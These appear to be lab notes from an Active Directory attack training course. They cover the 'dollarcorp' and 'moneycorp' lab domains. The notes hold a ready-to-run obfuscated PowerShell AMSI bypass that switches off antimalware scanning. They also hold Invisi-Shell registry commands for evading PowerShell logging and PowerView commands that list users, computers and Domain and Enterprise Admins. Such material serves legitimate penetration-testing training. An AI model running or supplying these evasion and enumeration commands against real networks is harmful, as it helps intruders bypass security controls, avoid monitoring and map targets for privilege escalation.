### SUMMARY 


### AMSI bypass
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + 
('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GetvarI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( 
"{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f 
'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 
'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( 
( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 
'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}"
-f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

### Start a PowerShell session using Invisi-Shell to avoid enhanced logging
```
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```
C:\AD\Tools>set COR_ENABLE_PROFILING=1
C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /ve /t REG_SZ /d 
"C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.
C:\AD\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

### Load PowerView
```
. C:\AD\Tools\PowerView.ps1
```

### Learning Objective 1
**Task**
#### Enumerate following for the dollarcorp domain:
* Users
* Computers
* Domain Administrators
* Enterprise Administrators
* Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
* Find a file share where studentx has Write permissions.


### List informations about all users 
```
Get-DomainUser
```

### List a specific property of all the users
```
Get-DomainUser | select -ExpandProperty samaccountname
```

### Enumerate member computers
```
Get-DomainComputer | select -ExpandProperty dnshostname
```

### See details of the Domain Admins group
```
Get-DomainGroup -Identity "Domain Admins"
```

### Enumerate members of the Domain Admins group
```
Get-DomainGroupMember -Identity "Domain Admins"
```

### Enumerate members of the Enterprise Admins group
```
Get-DomainGroupMember -Identity "Enterprise Admins"
```

### Query the root domain as Enterprise Admins group is present only in the root of a forest
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

